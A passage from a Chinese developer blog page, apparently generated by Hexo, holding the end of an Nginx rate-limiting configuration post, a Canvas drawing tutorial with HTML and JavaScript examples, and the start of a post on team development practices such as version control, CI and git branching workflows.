class="line">            <span class="comment"># ...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="其他配置项"><a href="#其他配置项" class="headerlink" title="其他配置项"></a>其他配置项</h3><h4 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h4><p>被延误的请求将记录在 warn 日志中；被拒绝的请求将请求在 error 日志中；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2015/06/13 04:20:00 [error] 120315#0: *32086 limiting requests, excess: 1.000 by zone &quot;mylimit&quot;, client: 192.168.1.2, server: nginx.com, request: &quot;GET / HTTP/1.0&quot;, host: &quot;nginx.com&quot;</span><br></pre></td></tr></table></figure>

<p>但是可以手工指定日志等级，以下示例即为指定日志等级为 warn；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">location /login/ &#123;</span><br><span class="line">    limit_req zone=mylimit burst=20 nodelay;</span><br><span class="line">    limit_req_log_level warn;</span><br><span class="line"> </span><br><span class="line">    proxy_pass http://my_upstream;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当请求被拒绝时，默认是返回 503 的错误码，如有需要，可以手工设置，以下示例设置为 444</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> /login/ &#123;</span><br><span class="line">    <span class="attribute">limit_req</span> zone=login burst=<span class="number">4</span> nodelay;</span><br><span class="line">    <span class="attribute">limit_req_status</span> <span class="number">444</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果某个路径需要拒绝所有请求，则可以通过设置 deny all 实现；</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> /foo.php &#123;</span><br><span class="line">    <span class="attribute">deny</span> all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/11/12/Nginx%20%E9%85%8D%E7%BD%AE/" data-id="cm1c2i80n0013pkhp57z63w71" data-title="Nginx 常用配置" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" rel="tag">服务器</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%BD%AF%E4%BB%B6/" rel="tag">软件</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Canvas 用法" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/11/10/Canvas%20%E7%94%A8%E6%B3%95/" class="article-date">
  <time class="dt-published" datetime="2020-11-10T08:12:00.000Z" itemprop="datePublished">2020-11-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/11/10/Canvas%20%E7%94%A8%E6%B3%95/">Canvas 用法</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>canvas 是一个 HTML 标签，表面上看上去跟其他 HTML标签没有太大差别；但是通过它，可以在它所占据的区域中，绘制所需要的图形</p>
<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><p>首先需要在 HTML 文件中建立一个 canvas 标签；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">&#x27;tutorial&#x27;</span> <span class="attr">width</span>=<span class="string">&#x27;150&#x27;</span> <span class="attr">height</span>=<span class="string">&#x27;150&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>其次通过选择器选中它，调用它的 getContext() 方法，获得它的上下文对象，这个上下文对象后续要用来画图；</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> canvas = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;tutorial&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> context = canvas.<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>); <span class="comment">// 此处的参数 2d 表示获取 2d 类型的上下文对象，以绘制 2d 图形</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>canvas 有多种上下文对象，可以用来绘制不同类型的图片，例如 2D 图形、3D 图形；在调用 getContext 方法时，需要传入类型的参数，这样才能返回对应类型的上下文对象；</p>
</blockquote>
<p>以下是完整的 HTML 文件内容</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Canvas tutorial<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">function</span> <span class="title function_">draw</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> canvas = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;tutorial&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (canvas.<span class="property">getContext</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">var</span> ctx = canvas.<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">      <span class="selector-tag">canvas</span> &#123; <span class="attribute">border</span>: <span class="number">1px</span> solid black; &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--监听页面的 onload 事件；完成后触发 draw() 函数--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;draw();&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">&quot;tutorial&quot;</span> <span class="attr">width</span>=<span class="string">&quot;150&quot;</span> <span class="attr">height</span>=<span class="string">&quot;150&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="绘制形状"><a href="#绘制形状" class="headerlink" title="绘制形状"></a>绘制形状</h3><p>尝试在页面上绘制两个不同颜色的相互重叠的正方形</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;application/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">draw</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> canvas = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;canvas&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (canvas.<span class="property">getContext</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> ctx = canvas.<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        ctx.<span class="property">fillStyle</span> = <span class="string">&#x27;rgb(200, 0, 0)&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        ctx.<span class="title function_">fillRect</span>(<span class="number">10</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">50</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        ctx.<span class="property">fillStyle</span> = <span class="string">&#x27;rgba(0, 0, 200, 0.5)&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        ctx.<span class="title function_">fillRect</span>(<span class="number">30</span>, <span class="number">30</span>, <span class="number">50</span>, <span class="number">50</span>);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;draw();&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">&quot;canvas&quot;</span> <span class="attr">width</span>=<span class="string">&quot;150&quot;</span> <span class="attr">height</span>=<span class="string">&quot;150&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>最终执行效果如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201108171146.png"></p>
<blockquote>
<p>知识点：ctx 的方法并不是一次性的，而是可以多次重复调用的，每调用一次，都会根据参数产生一次效果，可以理解为 ctx 就像画笔一样，每调用一次画笔的方法，都会画上相应的效果；多次调用，就会有多个效果；</p>
</blockquote>
<p>canvas 原生只支持两种形状，一个是长方形，一个是路径（即由点连接起来的线）；其他图形都可以通过路径来实现；幸运的是，有一堆提供定义好的函数，可以操作路径生成常见的形状，甚至是复杂的图形，而无须直接通过绘制线来实现；</p>
<p>绘制长方形的函数共有三个：</p>
<ul>
<li>fillRect(x, y, width, height): 绘制有填充颜色的长方形</li>
<li>strokeRect(x, y, width, height): 绘制没有填充颜色的长方形，也即只有轮廓；</li>
<li>clearRect(x, y, width, height): 将指定位置的长方形区域擦除掉，变成完全透明的；</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">draw</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> canvas = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;canvas&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (canvas.<span class="property">getContext</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> ctx = canvas.<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    ctx.<span class="title function_">fillRect</span>(<span class="number">25</span>, <span class="number">25</span>, <span class="number">100</span>, <span class="number">100</span>); <span class="comment">// 绘制尺寸为 100 正方形</span></span><br><span class="line">    ctx.<span class="title function_">clearRect</span>(<span class="number">45</span>, <span class="number">45</span>, <span class="number">60</span>, <span class="number">60</span>); <span class="comment">// 将内部 60*60 的区域挖空</span></span><br><span class="line">    ctx.<span class="title function_">strokeRect</span>(<span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>); <span class="comment">// 在挖空区域画一个 50*50 的正方形轮廓</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201108172838.png"></p>
<blockquote>
<p>注意：长方形的三个函数在调用后，会在画布上立即产生绘制后的效果；但路径相关的函数并非如此；</p>
</blockquote>
<h3 id="基于图像"><a href="#基于图像" class="headerlink" title="基于图像"></a>基于图像</h3><h4 id="绘制"><a href="#绘制" class="headerlink" title="绘制"></a>绘制</h4><p>drawImage 方法的第一个参数 image 有特殊的类型要求，一般是通过 canvas.createImage 方法来创建一个空白图像对象 img ，然后给 img 的  onload 方法添加回调函数，表示当图片加载完成后将执行的动作，之后给 img 的 src 赋值图片的 URL 或本地路径（赋值后会触发 onload 事件）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> img = canvas.<span class="title function_">createImage</span>();</span><br><span class="line">img.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;img onload done.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&quot;http://img.url.com&quot;</span></span><br><span class="line">context.<span class="title function_">drawImage</span>(img, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<h4 id="缩放"><a href="#缩放" class="headerlink" title="缩放"></a>缩放</h4><h4 id="剪裁"><a href="#剪裁" class="headerlink" title="剪裁"></a>剪裁</h4><p><a target="_blank" rel="noopener" href="https://wiki.developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D/drawImage"><code>drawImage(image, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight)</code></a></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201108191714.png"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;draw();&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">&quot;canvas&quot;</span> <span class="attr">width</span>=<span class="string">&quot;150&quot;</span> <span class="attr">height</span>=<span class="string">&quot;150&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">&quot;source&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://mdn.mozillademos.org/files/5397/rhino.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;227&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">&quot;frame&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://mdn.mozillademos.org/files/242/Canvas_picture_frame.png&quot;</span> <span class="attr">width</span>=<span class="string">&quot;132&quot;</span> <span class="attr">height</span>=<span class="string">&quot;150&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">draw</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> canvas = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;canvas&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> ctx = canvas.<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>);</span><br><span class="line">  <span class="comment">// Draw slice</span></span><br><span class="line">  ctx.<span class="title function_">drawImage</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;source&#x27;</span>),</span><br><span class="line">                <span class="number">33</span>, <span class="number">71</span>, <span class="number">104</span>, <span class="number">124</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">87</span>, <span class="number">104</span>);</span><br><span class="line">  <span class="comment">// Draw frame</span></span><br><span class="line">  ctx.<span class="title function_">drawImage</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;frame&#x27;</span>), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201108191910.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/11/10/Canvas%20%E7%94%A8%E6%B3%95/" data-id="cm1c2i8050001pkhpbf7ugg1z" data-title="Canvas 用法" class="article-share-link"><span class="fa fa-share">Teilen</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/javascript/" rel="tag">javascript</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%BD%AF%E4%BB%B6/" rel="tag">软件</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-高效团队开发" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/11/04/%E9%AB%98%E6%95%88%E5%9B%A2%E9%98%9F%E5%BC%80%E5%8F%91/" class="article-date">
  <time class="dt-published" datetime="2020-11-04T07:10:00.000Z" itemprop="datePublished">2020-11-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/11/04/%E9%AB%98%E6%95%88%E5%9B%A2%E9%98%9F%E5%BC%80%E5%8F%91/">高效团队开发</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="1-什么是团队开发"><a href="#1-什么是团队开发" class="headerlink" title="1. 什么是团队开发"></a>1. 什么是团队开发</h2><h3 id="待解决的问题"><a href="#待解决的问题" class="headerlink" title="待解决的问题"></a>待解决的问题</h3><ul>
<li>“谁”“到何时为止”做了“什么事情”，“怎样”算做“完成”等；</li>
<li>在团队内部共享代码等各类工作成果；</li>
<li>保证各成员能够利用工作成果并行作业，同时防止工作成果遭到破坏；</li>
<li>在团队中共享从项目中学到的知识；</li>
<li>证明开发出的软件，在任何时间都是可以正常运行的；</li>
<li>构建自动化的工作流程，确保任何人都可以正确的开发、测试和发布；</li>
</ul>
<h3 id="如何解决问题"><a href="#如何解决问题" class="headerlink" title="如何解决问题"></a>如何解决问题</h3><ul>
<li>版本管理</li>
<li>缺陷管理</li>
<li>持续集成</li>
<li>持续交付</li>
<li>回归测试</li>
</ul>
<h2 id="2-团队开发中的问题"><a href="#2-团队开发中的问题" class="headerlink" title="2. 团队开发中的问题"></a>2. 团队开发中的问题</h2><h3 id="重要的邮件太多，无法确定处理的优先顺序"><a href="#重要的邮件太多，无法确定处理的优先顺序" class="headerlink" title="重要的邮件太多，无法确定处理的优先顺序"></a>重要的邮件太多，无法确定处理的优先顺序</h3><p>使用邮件交流问题并不是一个好的方法，因为邮件算不上一种格式化的数据，很难归类整理；</p>
<p>解决方法：使用版本缺陷系统进行问题的管理；</p>
<h3 id="没有能用于验证的环境"><a href="#没有能用于验证的环境" class="headerlink" title="没有能用于验证的环境"></a>没有能用于验证的环境</h3><p>如果没有用于验证的环境，将导致每次复现 BUG 需要花费很长的时间，导致效率很低；</p>
<p>解决方法：搭建多个环境，分别用于开发、验证、测试、发布等；</p>
<h3 id="用别名目录管理分支"><a href="#用别名目录管理分支" class="headerlink" title="用别名目录管理分支"></a>用别名目录管理分支</h3><p>用于实现谁、何时、做了什么样的修改；</p>
<h3 id="重新制作数据库比较困难"><a href="#重新制作数据库比较困难" class="headerlink" title="重新制作数据库比较困难"></a>重新制作数据库比较困难</h3><p>数据库的变更操作也应纳入版本系统进行管理，确保每次的操作内容、顺序在各个环境都是一致的，而不是各个开发环境执行自己的；</p>
<h3 id="不运行系统就无法察觉的问题"><a href="#不运行系统就无法察觉的问题" class="headerlink" title="不运行系统就无法察觉的问题"></a>不运行系统就无法察觉的问题</h3><p>测试时，需要确保将全员的代码集中到一起运行，以免发生退化；</p>
<p>解决方案：持续集成，每次提交新代码，就合并代码并自动化测试，在第一时间暴露问题；</p>
<h3 id="覆盖了其他组员修正的代码"><a href="#覆盖了其他组员修正的代码" class="headerlink" title="覆盖了其他组员修正的代码"></a>覆盖了其他组员修正的代码</h3><p>当合并其他成员的代码时，如果出现冲突，有些开发人员可能直接将其他成员的代码进行覆盖，导致出现问题；</p>
<p>解决方案：持续集成；</p>
<h3 id="无法自信的地进行代码重构"><a href="#无法自信的地进行代码重构" class="headerlink" title="无法自信的地进行代码重构"></a>无法自信的地进行代码重构</h3><p>缺少措施避免出现退化；</p>
<p>解决方案：自动化测试；</p>
<h3 id="不知道-BUG-的修正日期，也不能追踪退化"><a href="#不知道-BUG-的修正日期，也不能追踪退化" class="headerlink" title="不知道 BUG 的修正日期，也不能追踪退化"></a>不知道 BUG 的修正日期，也不能追踪退化</h3><p>缺少缺陷跟踪系统，导致需要从一堆邮件中查询当时的情况；</p>
<p>解决方案：CI、缺陷跟踪、版本管理三个工具是确保项目高效开发的神器；甚至还应该考虑使用自动化部署；</p>
<h3 id="没有灵活使用分支和标签"><a href="#没有灵活使用分支和标签" class="headerlink" title="没有灵活使用分支和标签"></a>没有灵活使用分支和标签</h3><p>导致合并的时候容易出现混乱；有时在切换分支修复某些 BUG，切换回新功能分支时，忘了合并刚才的 BUG 分支；</p>
<h3 id="在测试环境、正式环境上无法运行"><a href="#在测试环境、正式环境上无法运行" class="headerlink" title="在测试环境、正式环境上无法运行"></a>在测试环境、正式环境上无法运行</h3><p>缺少统一管理第三方模块，确保在各个环境的依赖实现一致性的办法；</p>
<p>解决方案： docker；</p>
<h3 id="发布太复杂，以至于需要发布手册"><a href="#发布太复杂，以至于需要发布手册" class="headerlink" title="发布太复杂，以至于需要发布手册"></a>发布太复杂，以至于需要发布手册</h3><p>涉及如何更新DDL、依赖的库以及配置文件；</p>
<p>解决方案：持续交付；</p>
<h2 id="3-版本管理系统"><a href="#3-版本管理系统" class="headerlink" title="3. 版本管理系统"></a>3. 版本管理系统</h2><p>Git 等分布式版本管理系统</p>
<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul>
<li>能将代码完整地复制到本地</li>
<li>运行速度快</li>
<li>临时作业的提交易于管理</li>
<li>分支、合并简单方便</li>
<li>可以不受地点的限制进行协作开发</li>
</ul>
<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul>
<li>系统中没有真正意义上的最新版本</li>
<li>没有真正意义上的版本号</li>
<li>工作流程的配置过于灵活，容易产生混乱</li>
<li>有一定的学习成本</li>
</ul>
<h3 id="需纳入版本管理的内容"><a href="#需纳入版本管理的内容" class="headerlink" title="需纳入版本管理的内容"></a>需纳入版本管理的内容</h3><ul>
<li>代码</li>
<li>需求定义和设计等文档</li>
<li>库的依赖</li>
<li>数据库初始化命令</li>
<li>环境配置文件</li>
</ul>
<h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><p>Git 的每次提交有一个唯一识别码，但是它比较难记，为了让它更具备可识别性，可以为该提交添加标签，通过标签来识别；</p>
<blockquote>
<p>虽然分支也可以使用标签，但我发现好像并不是很有必要，貌似直接用分支名就够了；</p>
</blockquote>
<h3 id="工作模式"><a href="#工作模式" class="headerlink" title="工作模式"></a>工作模式</h3><h4 id="中央集权型工作流"><a href="#中央集权型工作流" class="headerlink" title="中央集权型工作流"></a>中央集权型工作流</h4><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201104151311.png"></p>
<h4 id="Github-型工作流"><a href="#Github-型工作流" class="headerlink" title="Github 型工作流"></a>Github 型工作流</h4><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201104151415.png"></p>
<h3 id="分支策略模式"><a href="#分支策略模式" class="headerlink" title="分支策略模式"></a>分支策略模式</h3><h4 id="Git-flow"><a href="#Git-flow" class="headerlink" title="Git-flow"></a>Git-flow</h4><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20201104151453.png"></p>
<h5 id="主分支"><a href="#主分支" class="headerlink" title="主分支"></a>主分支</h5><ul>
<li>master：为发布而建的分支，每次发布时都打上标签</li>
<li>develop：开发用的分支，发布前的最新版本</li>
</ul>
<h5 id="临时分支"><a href="#临时分支" class="headerlink" title="临时分支"></a>临时分支</h5><ul>
<li>feature：分离自 develop，开发特定功能的分支</li>
<li>release：分离自 develop，为发布做准备的分支，避免混入多余的 feature；</li>
<li>hotfix：分离自 master，修复 master 分支的故障；修复后，需要被合并到 master\develop\release 三个分支；</li>
</ul>
<blockquote>
<p>有专门的 git-flow 脚本实现以上的管理模式；<br>git-flow 的缺点是有些复杂，需要学习适应一下；同时不支持 GUI 可视化工具；</p>
</blockquote>
<h4 id="Github-flow"><a href="#Github-flow" class="headerlink" title="Github-flow"></a>Github-flow</h4><p>git-flow 的优点是非常清晰可靠，缺点是看上去有点复杂不易理解，因此产生了 github-flow 模式来降低学习成本；</p>
<h5 id="Github-flow-流程"><a href="#Github-flow-流程" class="headerlink" title="Github-flow 流程"></a>Github-flow 流程</h5><ul>
<li>master 分支的内容都可以进行发布；</li>
<li>添加内容时，直接从 master 分支新建分支</li>
<li>建立的分支在本地环境上提交，并以同名的分支定期向远程代码库进行 push</li>
<li>开发结束后向 master 分支发送 pull request</li>
<li>pull request 在被审核通过后，合并到 master，并从 master 向正式环境发布；</li>
</ul>
<blockquote>
<p>Jenkins 可以监控仓库中中的所有分支，这样每个分支 push 到仓库后，都会触发自动构建和测试，确保代码没有问题；</p>
</blockquote>
<h3 id="数据库模式和数据的管理"><a href="#数据库模式和数据的管理" class="headerlink" title="数据库模式和数据的管理"></a>数据库模式和数据的管理</h3><p>问题发生的原因在于如果不同的开发人员，在设置数据库初始化的命令顺序上面，可能存在冲突，导致一些功能无法正常运行；</p>
<p>数据库版本管理的必要条件</p>
<ul>
<li>在任意环境中，都能使用相同的步骤来构建数据库</li>
<li>能够反复执行多次</li>
